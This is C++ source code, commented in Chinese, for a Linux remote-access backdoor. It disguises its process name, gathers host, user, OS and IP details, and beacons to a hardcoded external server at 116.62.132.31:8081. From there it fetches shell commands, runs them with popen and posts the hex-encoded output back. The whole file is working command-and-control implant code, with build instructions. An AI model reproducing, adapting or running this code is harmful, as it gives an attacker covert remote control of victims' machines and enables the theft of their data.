
/*

#define PROC_NAME "testprocess" 伪造的进程名字
int Heartbeat_time = 2; //心跳时间

apt-get install libcurl4-gnutls-dev
gcc main.cpp -lcurl -lstdc++ -lpthread

*/



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>

#include <queue>
#include <curl/curl.h>
#include <stdlib.h>
#include <string>


#include <thread> //多线程
#include <queue> //队列
#include <sys/utsname.h>	//uname

#include <arpa/inet.h>
#include <ifaddrs.h>
#include <netinet/in.h> 

std::queue<char*> worker_queue; //任务队列


#define MAXLINE 102400

char infotype[MAXLINE] = "0";
char cmdtype[MAXLINE] = "1";

#define PROC_NAME "testprocess"
char serverip[MAXLINE] = "http://116.62.132.31:8081";
//char serverip[MAXLINE] = "http://127.0.0.1";
int Heartbeat_time = 5; //心跳时间默认5s




//获取内网ip
int getip(char ip[1024]) {
	struct ifaddrs* ifAddrStruct = NULL;
	struct ifaddrs* ifa = NULL;
	void* tmpAddrPtr = NULL;

	getifaddrs(&ifAddrStruct);

	for (ifa = ifAddrStruct; ifa != NULL; ifa = ifa->ifa_next) {
		if (!ifa->ifa_addr) {
			continue;
		}
		if (ifa->ifa_addr->sa_family == AF_INET) { // check it is IP4
			// is a valid IP4 Address
			tmpAddrPtr = &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr;
			char addressBuffer[INET_ADDRSTRLEN];
			
			inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);

			char f[MAXLINE];//过滤
			sprintf(f, "127.0.0.1");
			
			if (strcmp(addressBuffer, f) == 0) {//如果是127.0.0.1就跳过
				continue;
			}
			sprintf(ip, addressBuffer);
			return 0;
		}
		

	}
	return 0;
}


std::string string_to_hex(const std::string& input)
{
	static const char hex_digits[] = "0123456789ABCDEF";

	std::string output;
	output.reserve(input.length() * 2);
	for (unsigned char c : input)
	{
		output.push_back(hex_digits[c >> 4]);
		output.push_back(hex_digits[c & 15]);
	}
	return output;
}

int _getuid() {
	srand(time(0));
	int uid;
	uid = rand();
	return uid;
}

int uid = _getuid();



//去掉首尾空格
std::string trimstr(std::string s) {
	size_t n = s.find_last_not_of(" \r\n\t");
	if (n != std::string::npos) {
		s.erase(n + 1, s.size() - n);
	}
	n = s.find_first_not_of(" \r\n\t");
	if (n != std::string::npos) {
		s.erase(0, n);
	}
	return s;
}


//执行命令函数
int cmd_exec(char *cmd,char *result) {
	
	FILE* stream;
	char   buf[MAXLINE];

	memset(buf, '\0', sizeof(buf));
	stream = popen(cmd, "r");
	
	fread(buf, sizeof(char), sizeof(buf), stream);
	

	sprintf(result, "%s",buf);

	pclose(stream);


	return 1;
}


//curl的指针回调
size_t WriteCallback(char* contents, size_t size, size_t nmemb, void* userp)
{
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}



//获取http响应
int get_response(char* server,char* uri,char* send_postdata,char* recv_data) {

	printf("[send] %s\n", send_postdata);
	curl_global_init(CURL_GLOBAL_ALL);

	CURL* easyhandle = curl_easy_init();
	std::string readBuffer;

	char url[MAXLINE];
	sprintf(url, "%s%s", server, uri);

	printf("request url %s\n", url);

	curl_easy_setopt(easyhandle, CURLOPT_URL, url);
	/*设置超时时间10秒*/
	curl_easy_setopt(easyhandle, CURLOPT_TIMEOUT, 10L);
	/* 指定POST数据 */
	curl_easy_setopt(easyhandle, CURLOPT_POSTFIELDS, send_postdata);
	curl_easy_setopt(easyhandle, CURLOPT_VERBOSE, 0L);
	curl_easy_setopt(easyhandle, CURLOPT_WRITEFUNCTION, WriteCallback);
	curl_easy_setopt(easyhandle, CURLOPT_WRITEDATA, &readBuffer);

	curl_easy_perform(easyhandle);
	readBuffer = trimstr(readBuffer);//去掉http响应首尾空格
	char* http_response = (char*)readBuffer.data();


	sprintf(recv_data, "%s",http_response);

	printf("[recv] %s\n\n", recv_data);
	return 0;
}


//发送心跳 接收指令
int Heartbeat(char* info) {
	
	while (true)
	{
		char type[1024];
		//		printf("Http Send request -> %s\n", info);
		get_response(serverip,(char *)"/status",info, type);
		
		
		if (strcmp(infotype,type)==0) {// type 0 进 info
			char cmd[MAXLINE];
			printf("go to info [%s]\n", type);
			get_response(serverip,(char*)"/info", info, cmd);//拿到响应
			//printf("Get cmd -> %s\n\n\n", cmd);
		
		}
		else if (strcmp(cmdtype, type) == 0) {
			printf("go to cmd [%s]\n", type);
			char cmd[MAXLINE];
			get_response(serverip,(char*)"/cmd", info, cmd);//拿到响应
			//printf("Get cmd -> %s\n\n\n", cmd);
			worker_queue.push(cmd);
		}
		
		sprintf(type, "999");

		sleep(Heartbeat_time);
		
	}
	return 0;
}

//执行队列任务
int exec_work() {

	while (true)
	{

		char* text_queue;
		if (!worker_queue.empty()) {
			text_queue = worker_queue.front();//访问队首元素，如例：q.front()，即最早被压入队列的元素。
			worker_queue.pop();//弹出队列的第一个元素
			
			
			//printf("Queue %s\n", text_queue);
			//执行命令获取结果
			char cmd_result[102400];

			cmd_exec(text_queue, cmd_result);

			//去掉命令结果的换行符并转为hex
			std::string tmp1= cmd_result;
			tmp1 = string_to_hex(tmp1);
			char* cmd_result1= (char*)tmp1.data();
			

			char cmd_postdata[MAXLINE];

			sprintf(cmd_postdata, "{\"uid\":\"%d\",\"result\":\"%s\"}", uid,cmd_result1);
			
			//发送命令结果
			char step_3_res[MAXLINE];//无意义 只是为了格式化
			get_response(serverip,(char*)"/cmdResult", cmd_postdata, step_3_res);


		}
		sleep(0.1);//每隔0.1s查看任务队列是否为空
	}
	
	
	return 0;
}


//替换字符串
void findAndReplaceAll(std::string& data, std::string toSearch, std::string replaceStr)
{
	// Get the first occurrence
	size_t pos = data.find(toSearch);

	// Repeat till end is reached
	while (pos != std::string::npos)
	{
		// Replace this occurrence of Sub String
		data.replace(pos, toSearch.size(), replaceStr);
		// Get the next occurrence from the current position
		pos = data.find(toSearch, pos + replaceStr.size());
	}
}

int main(int argc, char** argv)
{

	//
	struct utsname u;
	uname(&u);

	char osinfo[1024];
	char cpuinfo[1024];
	sprintf(osinfo, "%s %s %s ",u.sysname, u.nodename, u.release);
	sprintf(cpuinfo, "%s", u.machine);
	
	

	//修改进程名
	memset((void*)argv[0], '\0', strlen(argv[0]));
	strcpy(argv[0], PROC_NAME);
	
	char inter_ip[1024];
	getip(inter_ip);


	//基本信息获取
	int pid = getpid();
	char hostname[1024];
	gethostname(hostname, 1024);

	char* current_user;
	current_user = getlogin();

	char ip_json[1024];
	get_response((char*)"https://api.myip.com",(char*)"", (char*)"", (char *)ip_json);//获取外网ip

	std::string ip = ip_json;
	findAndReplaceAll(ip, "\"","\\\"");
	sprintf(ip_json, (char*)ip.data());

	char basic_information[MAXLINE];

	
	//拼接基础信息
	sprintf(basic_information, "{\"uid\":\"%d\",\"data\":\"{\\\"hostname\\\":\\\"%s\\\",\\\"user\\\":\\\"%s\\\",\\\"cpuinfo\\\":\\\"%s\\\",\\\"osinfo\\\":\\\"%s\\\",\\\"pid\\\":\\\"%d\\\",\\\"sleep_time\\\":\\\"%d\\\"}\",\"ip\":\"%s\",\"inner_ip\":\"%s\"}", uid, hostname, current_user,cpuinfo,osinfo, pid, Heartbeat_time, ip_json, inter_ip);

	
	
	//发送心跳 接收指令到队列
	std::thread threadObj1(Heartbeat, basic_information);
	threadObj1.detach();//并发

	
	std::thread threadObj2(exec_work);
	threadObj2.join();
	return 0;
}